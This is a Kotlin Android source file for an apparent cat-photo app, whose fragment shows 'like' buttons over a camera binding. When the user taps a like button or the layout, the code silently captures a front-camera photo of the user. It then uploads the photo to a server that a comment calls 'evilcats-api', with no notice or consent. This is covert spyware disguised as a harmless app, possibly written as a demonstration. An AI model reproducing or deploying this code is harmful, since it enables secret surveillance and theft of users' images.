package com.example.catapp.Fragments

import android.os.Bundle
import android.util.Log
import android.view.*
import android.widget.ImageButton
import android.widget.LinearLayout
import androidx.camera.core.Camera
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.concurrent.futures.await
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import com.example.catapp.R
import com.example.catapp.databinding.CatsFragmentLayoutBinding
import kotlinx.coroutines.launch
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors


class CatsFragment: Fragment() {
    private lateinit var binding: CatsFragmentLayoutBinding
    private var camera: Camera? = null
    private var imageCapture: ImageCapture? = null
    private var cameraProvider: ProcessCameraProvider? = null
    private var lensFacing: Int = CameraSelector.LENS_FACING_FRONT
    private lateinit var cameraExecutor: ExecutorService

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        binding = CatsFragmentLayoutBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        cameraExecutor = Executors.newSingleThreadExecutor()
        try {
            lifecycleScope.launch {
                setUpCamera()
            }
            setupButtonClick()
            setupLinearLayoutListener()
        }catch (exc: java.lang.Exception){
            Log.e("ERROR", "binding failed", exc)
        }
    }


    private fun setupButtonClick() {
        val buttonList : List<ImageButton> = listOf(binding.likeButton0, binding.likeButton1, binding.likeButton2, binding.likeButton4,)
        buttonList.forEach { button ->
            button.setTag(false)
            button.setOnClickListener { view ->
                setupImageCapture()
                if(button.tag == false){
                    button.setImageResource(R.drawable.like_icon_filled)
                    button.setTag(true)
                }else{
                    button.setImageResource(R.drawable.like_icon)
                    button.setTag(false)
                }
                Log.d("DEBUG_BUTTON", "button clicked tag=${button.tag}")
            }
        }
    }

    private fun setupLinearLayoutListener() {
        val linearView = binding.root.findViewById<LinearLayout>(R.id.linearlayout)
        linearView.setOnClickListener{
            setupImageCapture()
        }
    }

    private fun setupImageCapture () {
        val imageFile = File(context?.filesDir,"imageFile.jpeg")
        val outputOptions = ImageCapture.OutputFileOptions.Builder(imageFile).build()
        val httpClient = OkHttpClient()
        cameraExecutor = Executors.newSingleThreadExecutor()
        imageCapture?.let {imageCapture ->
            imageCapture.takePicture(outputOptions, cameraExecutor,
                object : ImageCapture.OnImageSavedCallback {
                    override fun onError(exc: ImageCaptureException) {
                        Log.e("ERROR", "Photo capture failed: ${exc.message}", exc)
                    }
                    override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                        Log.d("DEBUG", "Photo capture succeeded: $imageFile")
                        try {
                            val formBody = MultipartBody.Builder()
                                .setType(MultipartBody.FORM)
                                .addFormDataPart("file", imageFile.name, imageFile.asRequestBody("image/jpeg".toMediaType()))
                                .build()
                            val request = Request.Builder()
                                //replace url with the host IP server running evilcats-api
                                .url("http://[host_IP]:8000/catpics/addpics/")
                                .post(formBody)
                                .build()

                            httpClient.newCall(request).execute().use { response ->
                                if (!response.isSuccessful) throw IOException("Unexpected code $response")
                                println(response.body!!.string())
                            }
                        }catch (exc : Exception){
                            Log.e("ERROR", "" + exc)
                        }
                    }
                }
            )
        }
    }

    private suspend fun setUpCamera() {
        cameraProvider = ProcessCameraProvider.getInstance(requireContext()).await()
        bindCameraUseCases()
    }

    private fun bindCameraUseCases() {
        val cameraSelector = CameraSelector.Builder().requireLensFacing(lensFacing).build()

        Log.d("catapp", "The camera is being build")
        imageCapture = ImageCapture.Builder()
            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
            .build()
        Log.d("DEBUG_ROTATION", "${imageCapture!!.targetRotation}" )
        camera = cameraProvider?.bindToLifecycle(
            this, cameraSelector, imageCapture,
        )
    }
}